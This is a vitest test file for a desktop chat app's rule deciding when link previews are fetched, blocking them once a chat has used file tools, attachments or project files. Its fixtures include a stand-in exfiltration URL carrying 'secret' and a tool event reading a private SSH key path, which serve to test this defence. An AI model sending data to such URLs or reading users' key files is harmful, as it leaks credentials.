import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { beforeAll, describe, expect, it, vi } from 'vitest'

// A real in-memory database: which chats may fetch link previews (#63).
vi.mock('electron', () => ({ shell: {}, app: { getPath: () => '' }, safeStorage: {} }))

const { openDatabase } = await import('../src/main/db/index')
const db = await import('../src/main/db/conversations')
const projects = await import('../src/main/db/projects')
const { previewsAllowed } = await import('../src/main/chat/exposure')
const { paths } = await import('../src/main/paths')

beforeAll(() => {
  paths.data = mkdtempSync(join(tmpdir(), 'ollmost-exposure-'))
  openDatabase(':memory:')
})

const chat = (over: { projectId?: string | null; toolSources?: string[] } = {}) =>
  db.createConversation({ projectId: over.projectId ?? null, model: 'm', think: null, skills: [], toolSources: over.toolSources })
const say = (conversationId: string, role: 'user' | 'assistant' = 'user') =>
  db.insertMessage({ conversationId, parentId: null, role, content: 'see https://evil.example/?d=secret' })

describe('link previews in a chat', () => {
  it('are fetched for links outside a chat and in a chat with no tools and no files', () => {
    expect(previewsAllowed(null)).toBe(true)
    const c = chat()
    say(c.id)
    const reply = say(c.id, 'assistant')
    // Web and skill tools alone don't count: they can't read this Mac or the user's accounts.
    db.updateMessage(reply.id, { toolEvents: [{ tool: 'web_search', args: { query: 'x' }, ok: true, summary: 'x' }] })
    expect(previewsAllowed(c.id)).toBe(true)
  })

  it('are not fetched in a chat with tool sources on', () => {
    expect(previewsAllowed(chat({ toolSources: ['mcp:files'] }).id)).toBe(false)
  })

  it('are not fetched in a chat whose earlier reply used a tool source, even after it was switched off', () => {
    const c = chat()
    const reply = say(c.id, 'assistant')
    db.updateMessage(reply.id, {
      toolEvents: [{ tool: 'files__read_file', args: { path: '~/.ssh/id_ed25519' }, ok: true, summary: 'read', source: 'Files' }]
    })
    expect(previewsAllowed(c.id)).toBe(false)
  })

  it('are not fetched in a chat with an attachment, or in a project with knowledge files', () => {
    const c = chat()
    const m = say(c.id)
    db.insertAttachment({
      id: 'att-1',
      kind: 'text',
      name: 'notes.txt',
      mime: 'text/plain',
      size: 5,
      path: join(paths.data, 'files', 'x'),
      text: 'notes',
      token_est: 2
    })
    db.linkAttachments(['att-1'], m.id)
    expect(previewsAllowed(c.id)).toBe(false)

    const p = projects.createProject({ name: 'Private' })
    const inProject = chat({ projectId: p.id })
    expect(previewsAllowed(inProject.id)).toBe(true)
    projects.insertProjectFile({
      id: 'pf-1',
      project_id: p.id,
      name: 'plan.md',
      mime: 'text/markdown',
      size: 4,
      path: join(paths.data, 'files', 'y'),
      text: 'plan',
      token_est: 1,
      folder: ''
    })
    expect(previewsAllowed(inProject.id)).toBe(false)
  })

  it("are not fetched for a chat that doesn't exist", () => {
    expect(previewsAllowed('no-such-chat')).toBe(false)
  })
})
